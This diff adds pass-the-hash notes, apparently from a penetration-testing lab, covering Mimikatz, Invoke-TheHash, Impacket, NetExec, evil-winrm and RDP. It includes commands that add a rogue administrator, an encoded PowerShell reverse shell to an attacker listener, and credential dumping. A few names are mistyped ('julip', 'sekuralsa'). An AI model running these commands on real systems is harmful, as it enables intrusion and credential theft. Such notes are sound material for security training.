@@ -1943,3 +1943,151 @@ This command:
 ---
 
 ## Windows Lateral Movement Techniques
+
+---
+
+### Pass the Hash
+
+A **Pass the Hash (PtH)** attack allows an attacker to authenticate using a password hash instead of the plaintext password. This completely bypasses the need to crack the hash.
+
+Microsoft’s **New Technology LAN Manager (NTLM)** is a family of authentication protocols that uses a challenge–response mechanism to validate identities without transmitting the user’s password. Although modern Windows environments primarily rely on **Kerberos**, NTLM is still widely supported for backward compatibility with legacy systems.
+
+A key weakness of NTLM is that password hashes are **unsalted**. As a result, possession of an NTLM hash alone is sufficient to authenticate as that user.
+
+As discussed in **Extracting Passwords from Windows Systems**, NTLM hashes can be obtained through:
+
+- Dumping the local SAM database
+- Extracting hashes from NTDS.dit on a Domain Controller
+- Pulling credentials from LSASS memory
+
+Assume the following credentials were recovered:
+
+```
+username:domain:hash
+
+julio:inlanefreight.htb:64F12CDDAA88057E06A81B54E73B949B
+```
+
+#### Pass the Hash with Mimikatz (Windows)
+
+Mimikatz provides the `sekurlsa::pth` module, which spawns a new process under the context of a supplied NTLM hash.
+
+Example using `cmd.exe`:
+
+```powershell
+mimikatz.exe privilege::debug "sekurlsa::pth /user:julip /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
+```
+
+This launches a command shell authenticated as the target user.
+
+#### Pass the Hash with PowerShell Invoke-TheHash (Windows)
+
+[Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) is a PowerShell toolkit that supports PtH over SMB and WMI.
+
+The following example uses SMB execution to create a new local administrator:
+
+```powershell
+Import-Module .\Invoke-TheHash.psd1
+
+Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
+```
+
+**Reverse Shell via Invoke-TheHash**
+
+Start a Netcat listener on the attacker system:
+
+```powershell
+.\nc.exe -lvnp 8001
+```
+
+Generate a Base64-encoded PowerShell reverse shell using [RevShells](https://www.revshells.com/):
+
+![Filtered output](./.images/reverse-shell.PNG)
+
+Then execute it remotely
+
+```powershell
+Import-Module .\Invoke-TheHash.psd1
+
+Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwAOAAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
+```
+
+A shell is returned to the listener:
+
+![Filtered output](./.images/reverse-shell2.PNG)
+
+#### Pass the Hash with Impacket (Linux)
+
+Impacket provides multiple tools for PtH-based execution. A common approach is `psexec`:
+
+```bash
+impacket-psexec administrator@10.129.204.23 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+```
+
+![Filtered output](./.images/impacket-shell.PNG)
+
+#### Pass the Hash with NetExec (Linux)
+
+`NetExec` supports PtH authentication and remote command execution:
+
+```bash
+netexec smb 10.129.204.23 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
+```
+
+![Filtered output](./.images/netexec-rce.PNG)
+
+#### Pass the Hash with evil-winrm (Linux)
+
+`Evil-WinRM` supports NTLM hash authentication over WinRM. This is useful when SMB is restricted.
+
+Example:
+
+```bash
+evil-winrm -i 10.129.204.23 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
+```
+
+![Filtered output](./.images/evilwinrm-pth.PNG)
+
+#### Pass the Hash with RDP (Linux)
+
+`xfreerdp`supports PtH via the `/pth` flag, but **Restricted Admin** Mode must be enabled on the target.
+
+If code execution is already available, enable it via registry:
+
+```powershell
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
+
+![Filtered output](./.images/evilwinrm-reg-key.PNG)
+
+Then connect via RDP:
+
+```bash
+xfreerdp  /v:10.129.204.23 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
+```
+
+Once connected, dump credentials:
+
+```powershell
+mimikatz.exe
+privilege::debug
+sekuralsa::logonpasswords
+```
+
+![Filtered output](./.images/sekuralsa.PNG)
+
+Using David’s NTLM hash:
+
+```
+c39f2beb3d2ec06a62cb887fb391dee0
+```
+
+Spawn a new shell and access network resources:
+
+```powershell
+mimikatz.exe privilege::debug "sekurlsa::pth /user:david /rc4:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe"
+```
+
+![Filtered output](./.images/pth.PNG)
+
+---
